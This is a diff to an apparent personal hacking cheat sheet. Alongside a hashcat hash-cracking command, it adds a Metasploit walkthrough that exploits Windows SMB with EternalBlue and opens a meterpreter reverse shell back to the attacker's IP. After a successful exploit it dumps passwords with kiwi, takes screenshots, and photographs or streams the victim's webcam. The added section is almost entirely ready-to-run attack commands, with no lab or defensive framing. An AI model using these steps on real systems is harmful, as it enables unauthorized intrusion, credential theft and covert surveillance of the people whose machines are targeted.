@@ -67,4 +67,30 @@ hashcat -m [hash type] -a [attack mode] [hash itself] --force
 hashcat -m 0 -a 3 5d41402abc4b2a76b9719d911017c592 --force
 ```
  ## msfconsole: setup everything and run exploit
- 
+ 1. using `nmap` or `armitage` find ip of device
+ 2. find if there is smb service
+ ```
+ nmap -v [ip address] -Pn -A -T5
+ ```
+ 3. run Metasploit
+ ```
+ sudo msfconsole
+ ```
+ 4. Follow these commands
+    1. `use exploit/windows/smb/ms17_010_eternalblue`
+    2. `set rhosts [target ip]`
+    3. `set payload windows/x64/meterpreter/reverse_tcp`
+    4. `set lhost [own ip]`
+    5. `set ForceExploit true`
+    6. `exploit`
+5. If exploit was **successful**
+   1. **get passwords**
+      1. `load kiwi`
+      2. `getprivs`
+      3. `creds all`
+   2. **take screenshot**
+      1. `screenshot`
+   3. **capture webcam**
+      1. `webcam_list` (check if there is any webcam)
+      2. `webcam_snap` (take a photo from webcam)
+      3. `webcam_stream` (to stream a video from a webcam)
